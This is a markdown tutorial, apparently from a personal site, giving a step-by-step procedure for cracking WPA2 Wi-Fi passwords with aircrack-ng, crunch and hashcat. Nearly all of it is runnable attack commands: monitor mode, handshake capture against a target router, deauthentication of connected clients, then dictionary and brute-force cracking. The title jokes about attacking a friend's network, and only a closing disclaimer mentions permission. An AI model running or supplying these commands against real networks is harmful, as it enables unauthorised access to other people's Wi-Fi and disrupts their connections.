## How to hack your best friends wifi? <br/> Just kidding, gonna teach you how to "hack" WPA2 wifi passwords with aircrack and crunch/ hashcat!

### Installing aircrack-ng

enter that commands to install the requirements:

```shell
sudo apt install aircrack-ng crunch hashcat -y
```

### Setting your interface to monitor mode

killing the processes before enabling monitor mode

```shell
sudo airmon-ng check kill
sudo pkill # numbers which got outputted
```

enabling monitor mode:

```shell
sudo airmon-ng start wlan0
```

### Capturing the WPA2 handshake

change the first question mark with the bssid of your target router and the second question mark with the channel of the target

```shell
sudo airodump-ng wlan0
sudo airodump-ng --bssid ? -c ? --write hash wlan0
```

### Forcing clients to reconnect to the target network

open another window and enter that commands <br/>
change the question mark to the targets bssid and the clients bssid which you are forcing to reconnect <br/>
you also don´t need to use the -c option, it would try to disconnect every client which is connected to the target

```shell
sudo aireplay-ng –0 2 –a ? –c ? wlan0
```

### Cracking the hash file via a dictionary attack (cpu, aircrack-ng)

unzipping a big wordlist (rockyou), kali linux has that file installed in /usr/share/wordlist/rockyou.txt <br/>
if you are using another linux distro which doesn´t have that file saved somewhere which is debian based, add my [repo](https://github.com/phoenixthrush/phoenixthrush.github.io#installation-debian-and-arch-based-distros) and install [rockyou](https://github.com/phoenixthrush/phoenixthrush.github.io#packages)!

steps for kali linux, if not skip that step <br/>
file ist getting stored at /usr/share/wordlist/rockyou.txt

```shell
cd /usr/share/wordlist/
sudo gzip -d rockyou.txt.gz
```

cracking the hash file with the rockyou dictionary

```shell
sudo aircrack-ng hash.cap -w /path/to/the/dictionary
```

### Cracking the hash file via bruteforce (cpu, crunch/ aircrack-ng)

generating a 8-10 long password with the chracters [abcdefgABC123?]

```shell
crunch 8 10 abcdefgABC123? | sudo aircrack-ng -e wifiname -w - /path/to/the/hash/file
```

### Cracking the hash file via a dictionary attack (gpu, hashcat)

converting a cap file from airodump-ng to a hc22000 file for hashcat support using a [cap2hashcat online converter](https://hashcat.net/cap2hashcat)

cracking the hash file with rockyou <br/>
if you are using another linux distro which doesn´t have the rockyou dictionary saved somewhere which is debian based, add my [repo](https://github.com/phoenixthrush/phoenixthrush.github.io#installation-debian-and-arch-based-distros) and install [rockyou](https://github.com/phoenixthrush/phoenixthrush.github.io#packages)!

```shell
hashcat -m 22000 hash.hc22000 rockyou.txt
```

### Cracking the hash file via bruteforce (gpu, hashcat)

```shell
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```

to create a password which contains 8 digits

here are the hashcat masks

```
?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?s =  !"#$%&'()*+,-./:;<=>?@[\]^_\`{|}~
?a = ?l?u?d?s
?b = 0x00 - 0xff
```

### Thats it!

contact me at [contact@phoenixthrush.com](mailto:contact@phoenixthrush.com) if you have questions and have fun cracking your OWN wifi!

### Disclaimer!

This tutorial only contains scripts for educational purposes! <br/>
Don´t crack someone else’s wifi, only your own wifi network or ask for a permisson first! <br/>
I am not liable for anything that may happen!
